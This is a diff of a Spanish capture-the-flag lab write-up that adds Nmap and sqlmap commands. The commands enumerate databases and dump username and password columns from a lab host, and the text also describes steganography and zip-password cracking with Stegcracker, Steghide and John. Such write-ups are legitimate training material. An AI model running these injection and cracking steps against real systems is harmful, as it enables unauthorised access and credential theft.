@@ -1,4 +1,4 @@
-Escaneo de puertos con Nmap
+Escaneo de puertos con Nmap:
 ```
 nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
 ```
@@ -26,22 +26,34 @@ sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) --dbs --
 
 ![](../../../Images/Pasted%20image%2020240813093707.png)
 
-Usaré la base de datos Users
+Usaré la base de datos "Users"
+
 2. Enumero posibles tablas, de esta base de datos:
+```
+sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) -D users --batch --forms
+```
 
 ![](../../../Images/Pasted%20image%2020240813093813.png)
 
 ![](../../../Images/Pasted%20image%2020240813093822.png)
 
-Obtengo la tabla llamada Usuarios
+Obtengo la tabla llamada "Usuarios"
+
 3. Enumeré posibles columnas de esta tabla:
+```
+sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) -D users -T usuarios --columns --batch --forms
+```
 
 ![](../../../Images/Pasted%20image%2020240813093851.png)
 
 ![](../../../Images/Pasted%20image%2020240813093906.png)
 
-Tengo 3 columnas id, password y username
+Tengo 3 columnas "id", "password" y "username"
+
 4. Y por último, enumeraré usuarios de estas 3 columnas:
+```
+sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) -D users -T usuarios -C id,password,username --batch --forms
+```
 
 ![](../../../Images/Pasted%20image%2020240813093942.png)
 
@@ -53,19 +65,19 @@ Tengo un posible nombre de directorio llamado "directoriotravieso", así que int
 
 Efectivamente existe y contiene una imagen
 
-Me la descargo y le haré esteganografía:
+Me la descargo y le haré esteganografía con Stegcracker:
 
 ![](../../../Images/Pasted%20image%2020240813094230.png)
 
-Y la contraseña de la imagen para poder extraer sus archivos ocultos es chocolate
+Y la contraseña de la imagen para poder extraer sus archivos ocultos es "chocolate"
 
-La extraigo:
+La extraigo con Steghide:
 
 ![](../../../Images/Pasted%20image%2020240813094325.png)
 
 Me extrae un .zip
 
-Le extraigo la hash con Zip2john y la crackeo con la herramienta John:
+Le extraigo el hash con Zip2john y lo crackeo con la herramienta John:
 
 ![](../../../Images/Pasted%20image%2020240813094413.png)
 
